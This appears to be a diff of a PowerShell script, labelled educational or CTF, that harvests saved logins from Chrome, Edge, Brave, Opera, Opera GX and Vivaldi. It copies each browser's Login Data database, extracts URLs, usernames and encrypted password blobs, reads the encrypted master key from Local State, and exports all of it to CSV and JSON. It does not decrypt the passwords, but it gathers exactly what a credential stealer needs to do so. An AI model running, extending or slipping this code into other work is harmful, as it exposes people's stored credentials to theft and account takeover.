@@ -1,94 +1,84 @@
-# ================================================
-# Multi-Browser Encrypted Password Extraction Tool
-# For Educational / CTF / Cybersecurity Assignments
-# ================================================
+# Universal Chromium Browser Encrypted Password Extraction Script
+# For educational use (CTF / cybersecurity labs). Extracts *encrypted* password data only.
 
 param(
-    [string]$OutputDir = ".\BrowserEncryptedData"
+    [string]$CSVPath = ".\BrowsersEncryptedPasswords.csv",
+    [string]$JSONPath = ".\BrowsersEncryptedData.json"
 )
 
-Write-Host "Multi-Browser Password Extraction Tool" -ForegroundColor Green
-Write-Host "======================================" -ForegroundColor Green
+Write-Host "Universal Chromium Browser Encrypted Password Extraction Tool" -ForegroundColor Green
+Write-Host "=================================================================" -ForegroundColor Green
 
-# Ensure output directory
-if (-not (Test-Path $OutputDir)) {
-    New-Item -ItemType Directory -Path $OutputDir | Out-Null
+# Define supported browsers and their paths
+$BrowserPaths = @{
+    "Brave"    = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"
+    "Chrome"   = "$env:LOCALAPPDATA\Google\Chrome\User Data"
+    "Edge"     = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
+    "Opera"    = "$env:APPDATA\Opera Software\Opera Stable"
+    "OperaGX"  = "$env:APPDATA\Opera Software\Opera GX Stable"
+    "Vivaldi"  = "$env:LOCALAPPDATA\Vivaldi\User Data"
 }
 
-# ----------------------------------------
-# List of Chromium-based browsers
-# ----------------------------------------
-$browsers = @(
-    @{ Name = "Brave"; Path = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data" },
-    @{ Name = "Chrome"; Path = "$env:LOCALAPPDATA\Google\Chrome\User Data" },
-    @{ Name = "Edge"; Path = "$env:LOCALAPPDATA\Microsoft\Edge\User Data" },
-    @{ Name = "Opera"; Path = "$env:APPDATA\Opera Software\Opera Stable" },  # Opera has slight variation
-    @{ Name = "Vivaldi"; Path = "$env:LOCALAPPDATA\Vivaldi\User Data" }
-)
-
-# ----------------------------------------
-# Function: Install SQLite3 if needed
-# ----------------------------------------
+# Function to install SQLite3 if needed
 function Install-SQLiteIfNeeded {
-    if (Test-Path ".\sqlite3.exe") { return $true }
-    try {
-        Write-Host "Downloading SQLite3..." -ForegroundColor Yellow
-        $sqliteUrl = "https://www.sqlite.org/2023/sqlite-tools-win32-x86-3430200.zip"
-        $tempZip = "sqlite-temp.zip"
-        
-        Invoke-WebRequest -Uri $sqliteUrl -OutFile $tempZip -UseBasicParsing
-        Expand-Archive -Path $tempZip -DestinationPath ".\sqlite-temp" -Force
-        Copy-Item ".\sqlite-temp\sqlite-tools-win32-x86-3430200\sqlite3.exe" ".\sqlite3.exe" -Force
-        
-        Remove-Item $tempZip -Force -ErrorAction SilentlyContinue
-        Remove-Item ".\sqlite-temp" -Recurse -Force -ErrorAction SilentlyContinue
-        
-        Write-Host "SQLite3 downloaded successfully." -ForegroundColor Green
-        return $true
-    } catch {
-        Write-Host "Failed to download SQLite3: $($_.Exception.Message)" -ForegroundColor Red
-        return $false
+    if (-not (Test-Path ".\sqlite3.exe")) {
+        try {
+            Write-Host "Downloading SQLite3..." -ForegroundColor Yellow
+            $sqliteUrl = "https://www.sqlite.org/2023/sqlite-tools-win32-x86-3430200.zip"
+            $tempZip = "sqlite-temp.zip"
+            
+            Invoke-WebRequest -Uri $sqliteUrl -OutFile $tempZip -UseBasicParsing
+            Expand-Archive -Path $tempZip -DestinationPath ".\sqlite-temp" -Force
+            Copy-Item ".\sqlite-temp\sqlite-tools-win32-x86-3430200\sqlite3.exe" ".\sqlite3.exe" -Force
+            
+            Remove-Item $tempZip -Force -ErrorAction SilentlyContinue
+            Remove-Item ".\sqlite-temp" -Recurse -Force -ErrorAction SilentlyContinue
+            
+            Write-Host "SQLite3 downloaded successfully." -ForegroundColor Green
+        } catch {
+            Write-Host "Failed to download SQLite3: $($_.Exception.Message)" -ForegroundColor Red
+            exit 1
+        }
     }
 }
 
-# ----------------------------------------
-# Function: Extract Encrypted Passwords (Generic Chromium)
-# ----------------------------------------
-function Get-ChromiumEncryptedPasswords {
-    param(
-        [string]$BrowserName,
-        [string]$UserDataPath
-    )
+# Function to extract master key from Local State file
+function Get-MasterKey {
+    param ($browserName, $browserPath)
 
-    $loginDataPath = Join-Path $UserDataPath "Default\Login Data"
-    $localStatePath = Join-Path $UserDataPath "Local State"
+    $localStatePath = Join-Path $browserPath "Local State"
+    if (-not (Test-Path $localStatePath)) { return $null }
 
-    if (-not (Test-Path $loginDataPath)) {
-        Write-Host "$BrowserName login database not found." -ForegroundColor Yellow
-        return $null
-    }
-
-    Write-Host "[$BrowserName] Extracting login database..." -ForegroundColor Cyan
-
-    # Master key info
-    $masterKeyInfo = $null
-    if (Test-Path $localStatePath) {
-        try {
-            $localStateContent = Get-Content $localStatePath -Raw | ConvertFrom-Json
-            $encryptedKey = $localStateContent.os_crypt.encrypted_key
-            $masterKeyInfo = @{
-                EncryptedKey = $encryptedKey
-                KeyLength = ([System.Convert]::FromBase64String($encryptedKey)).Length
+    try {
+        $localStateContent = Get-Content $localStatePath -Raw | ConvertFrom-Json
+        $encryptedKey = $localStateContent.os_crypt.encrypted_key
+        if ($encryptedKey) {
+            return @{
+                Browser       = $browserName
+                EncryptedKey  = $encryptedKey
+                KeyLength     = ([System.Convert]::FromBase64String($encryptedKey)).Length
                 ExtractionTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
             }
-        } catch { }
-    }
+        }
+    } catch { return $null }
+}
+
+# Function to extract encrypted passwords from Chromium browser
+function Get-EncryptedPasswords {
+    param ($browserName, $browserPath)
+
+    $loginDataPath = Join-Path $browserPath "Default\Login Data"
+    if (-not (Test-Path $loginDataPath)) { return @() }
 
     $results = @()
+    $encryptedData = @()
 
     try {
-        $tempDbPath = "$BrowserName-temp.db"
+        $tempDbPath = "temp_${browserName}.db"
         Copy-Item $loginDataPath $tempDbPath -Force
+
+        $tempCsvPath = "temp_${browserName}_output.csv"
+        $sqlitePath = ".\sqlite3.exe"
 
         $query = @"
 SELECT 
@@ -98,66 +88,95 @@ SELECT
     length(password_value) as password_length
 FROM logins;
 "@
-
-        $tempCsvPath = "$BrowserName-temp.csv"
-        & ".\sqlite3.exe" -csv -header $tempDbPath $query > $tempCsvPath
+        & $sqlitePath -csv -header $tempDbPath $query > $tempCsvPath
 
         if (Test-Path $tempCsvPath) {
             $logins = Import-Csv $tempCsvPath
             foreach ($login in $logins) {
-                $results += [PSCustomObject]@{
-                    Browser = $BrowserName
+                $entryId = [System.Guid]::NewGuid().ToString()
+
+                $encryptedEntry = @{
+                    Id = $entryId
+                    Browser = $browserName
                     URL = $login.origin_url
                     Username = $login.username_value
                     HexData = $login.password_hex
                     DataLength = $login.password_length
+                    EncryptionVersion = "Unknown"
+                    ExtractionTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+                }
+
+                # Detect encryption prefix (v10, v11, v20)
+                if ($login.password_hex -and $login.password_hex.Length -ge 6) {
+                    try {
+                        $prefixBytes = [System.Convert]::ToByte($login.password_hex.Substring(0, 2), 16),
+                                      [System.Convert]::ToByte($login.password_hex.Substring(2, 2), 16),
+                                      [System.Convert]::ToByte($login.password_hex.Substring(4, 2), 16)
+                        $prefix = [System.Text.Encoding]::ASCII.GetString($prefixBytes)
+                        if ($prefix -in @("v10","v11","v20")) {
+                            $encryptedEntry.EncryptionVersion = $prefix
+                        }
+                    } catch { }
+                }
+
+                $encryptedData += $encryptedEntry
+
+                $results += [PSCustomObject]@{
+                    ID = $entryId
+                    Browser = $browserName
+                    URL = $login.origin_url
+                    Username = $login.username_value
+                    EncryptionVersion = $encryptedEntry.EncryptionVersion
+                    DataLength = $login.password_length
+                    HexData = if ($login.password_hex.Length -gt 100) {
+                                $login.password_hex.Substring(0, 100) + "..."
+                              } else { $login.password_hex }
                     ExtractionTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
                 }
             }
             Remove-Item $tempCsvPath -Force
         }
-
         Remove-Item $tempDbPath -Force
-    } catch {
-        Write-Host "[$BrowserName] Error: $($_.Exception.Message)" -ForegroundColor Red
-    }
+    } catch { }
 
-    return @{
-        Browser = $BrowserName
-        MasterKey = $masterKeyInfo
-        Entries = $results
-    }
+    return @{ Summary = $results; DetailedData = $encryptedData }
 }
 
-# ----------------------------------------
-# Main Execution
-# ----------------------------------------
-if (-not (Install-SQLiteIfNeeded)) {
-    Write-Host "SQLite3 is required. Exiting." -ForegroundColor Red
-    exit 1
+# --- Main Execution ---
+Install-SQLiteIfNeeded
+
+$allSummaries = @()
+$allDetails = @()
+$allKeys = @()
+
+foreach ($browser in $BrowserPaths.Keys) {
+    $path = $BrowserPaths[$browser]
+    Write-Host "`n>>> Processing $browser..." -ForegroundColor Cyan
+
+    $keyInfo = Get-MasterKey -browserName $browser -browserPath $path
+    if ($keyInfo) { $allKeys += $keyInfo }
+
+    $result = Get-EncryptedPasswords -browserName $browser -browserPath $path
+    $allSummaries += $result.Summary
+    $allDetails += $result.DetailedData
 }
 
-foreach ($browser in $browsers) {
-    $name = $browser.Name
-    $path = $browser.Path
+if ($allSummaries.Count -gt 0) {
+    Write-Host "`nExtracted $($allSummaries.Count) encrypted password entries from all browsers." -ForegroundColor Green
+    $allSummaries | Export-Csv -Path $CSVPath -NoTypeInformation -Encoding UTF8 -Force
 
-    if (Test-Path $path) {
-        $result = Get-ChromiumEncryptedPasswords -BrowserName $name -UserDataPath $path
-        if ($result -ne $null) {
-            $csvOut = Join-Path $OutputDir "$name-Passwords.csv"
-            $jsonOut = Join-Path $OutputDir "$name-Passwords.json"
-
-            try {
-                $result.Entries | Export-Csv -Path $csvOut -NoTypeInformation -Encoding UTF8 -Force
-                $result | ConvertTo-Json -Depth 10 | Out-File -FilePath $jsonOut -Encoding UTF8
-                Write-Host "[$name] Exported to $csvOut and $jsonOut" -ForegroundColor Green
-            } catch {
-                Write-Host "[$name] Export failed: $($_.Exception.Message)" -ForegroundColor Red
-            }
+    $exportData = @{
+        Metadata = @{
+            ExtractionTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+            OS = [System.Environment]::OSVersion.VersionString
         }
-    } else {
-        Write-Host "[$name] Not installed on this system." -ForegroundColor DarkGray
+        MasterKeys = $allKeys
+        EncryptedPasswords = $allDetails
     }
-}
+    $exportData | ConvertTo-Json -Depth 10 | Out-File -FilePath $JSONPath -Encoding UTF8
 
-Write-Host "`nAll browser extractions completed." -ForegroundColor Green
+    Write-Host "Summary exported to: $CSVPath" -ForegroundColor Green
+    Write-Host "Detailed encrypted data exported to: $JSONPath" -ForegroundColor Green
+} else {
+    Write-Host "`nNo encrypted passwords found in any supported browser." -ForegroundColor Yellow
+}
